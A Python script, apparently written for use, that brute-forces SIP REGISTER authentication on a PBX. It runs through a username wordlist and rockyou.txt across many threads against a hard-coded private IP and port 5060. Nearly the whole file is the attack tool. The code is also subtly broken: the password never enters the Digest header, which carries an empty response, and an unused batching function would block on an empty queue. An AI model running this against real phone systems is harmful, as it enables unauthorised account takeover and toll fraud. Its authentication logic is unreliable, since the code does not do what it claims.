import socket
import random
import string
import threading
from queue import Queue

def generate_random_call_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def generate_random_extension(start_range, end_range):
    return str(random.randint(start_range, end_range))

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    return local_ip
print_lock = threading.Lock()

def send_sip_register(ip, port, username, password, from_user, to_user, extension_range_start, extension_range_end, timeout=5):
    call_id = generate_random_call_id()
    contact_extension = generate_random_extension(extension_range_start, extension_range_end)
    local_ip = get_local_ip()

    # Create a UDP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)  # Set the socket timeout for sending and receiving

    try:
        # Craft the SIP REGISTER packet
        register_msg = (
            f"REGISTER sip:{ip} SIP/2.0\r\n"
            f"Via: SIP/2.0/UDP {local_ip}:{port};branch=z9hG4bK-{call_id}\r\n"
            f"Max-Forwards: 70\r\n"
            f"From: <sip:{from_user}@{local_ip}>;tag={call_id}\r\n"
            f"To: <sip:{to_user}@{ip}>\r\n"
            f"Call-ID: {call_id}@{ip}\r\n"
            f"CSeq: 1 REGISTER\r\n"
            f"Authorization: Digest username=\"{username}\", realm=\"{ip}\", nonce=\"{call_id}\", uri=\"sip:{to_user}@{ip}\", response=\"\"\r\n"
            f"Contact: <sip:{from_user}@{local_ip}:{port};extension={contact_extension}>\r\n"
            f"Content-Length: 0\r\n\r\n"
        )

        with print_lock:
            print(f"Attempting registration with username: {username} and password: {password}")

        # Send the packet
        s.sendto(register_msg.encode(), (ip, port))

        try:
            # Wait for a response (you can adjust the buffer size as needed)
            data, addr = s.recvfrom(4096)

            with print_lock:
                print("Received response from:", addr)
                print(data.decode())  # Print the response

            response_code = data.decode().split(" ")[1]  # Extract the response code

            if response_code == "200":
                with print_lock:
                    print("Successful registration with", username, "and", password)
                return True  # Return True to indicate success
            elif response_code == "401":
                with print_lock:
                    print("Unauthorized response received for", username, "and", password)

        except socket.timeout:
            with print_lock:
                print(f"Request to {ip}:{port} timed out")

    except Exception as e:
        with print_lock:
            print(f"An error occurred: {str(e)}")

    s.close()

    return False


def register_worker(pbx_ip, pbx_port, pbx_to_user, extension_start, extension_end, timeout, username, password, lock):
    with lock:
        send_sip_register(
            ip=pbx_ip, 
            port=pbx_port,
            username=username,
            password=password,
            from_user=username,
            to_user=pbx_to_user,
            extension_range_start=extension_start,
            extension_range_end=extension_end,
            timeout=timeout
        )

# Read username and password wordlists from TXT files
def read_wordlist_from_txt(filename):
    wordlist = []
    with open(filename, 'r', encoding='latin-1') as file:
        for line in file:
            word = line.strip()
            if word:  # Skip empty lines
                wordlist.append(word)
    return wordlist
# Define the number of threads and batch size
NUM_THREADS = 10
BATCH_SIZE = 100

def process_batch(ip, port, username, password_batch, from_user, to_user, extension_range_start, extension_range_end, timeout=5):
    for password in password_batch:
        send_sip_register(ip, port, username, password, from_user, to_user, extension_range_start, extension_range_end, timeout)

def brute_force(ip, port, username, password_wordlist, from_user, to_user, extension_range_start, extension_range_end, timeout=5):
    # Split the password wordlist into batches
    password_batches = [password_wordlist[i:i + BATCH_SIZE] for i in range(0, len(password_wordlist), BATCH_SIZE)]

    # Create a queue to store batches of passwords
    batch_queue = Queue()

    # Create and start threads for processing batches
    threads = []
    for _ in range(NUM_THREADS):
        thread = threading.Thread(target=process_batch, args=(ip, port, username, batch_queue.get(), from_user, to_user, extension_range_start, extension_range_end, timeout))
        thread.start()
        threads.append(thread)

    # Enqueue password batches for processing
    for batch in password_batches:
        batch_queue.put(batch)

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

# Example usage
username_wordlist = read_wordlist_from_txt("/home/epsilon/Desktop/Usernames")
password_wordlist = read_wordlist_from_txt("/usr/share/wordlists/rockyou.txt")

pbx_ip = "192.168.50.216"
pbx_port = 5060
pbx_to_user = "100"
extension_start = 2001
extension_end = 2001
timeout = .5  # Adjust the timeout value as needed


max_threads = 10  # Maximum number of concurrent threads

lock = threading.Lock()
threads = []

for username in username_wordlist:
    for password in password_wordlist:
        while threading.active_count() > max_threads:
            pass  # Wait for some threads to finish before starting new ones
        thread = threading.Thread(target=register_worker, args=(pbx_ip, pbx_port, pbx_to_user, extension_start, extension_end, timeout, username, password, lock))
        thread.start()
        threads.append(thread)

# Wait for all threads to finish
for thread in threads:
    thread.join()


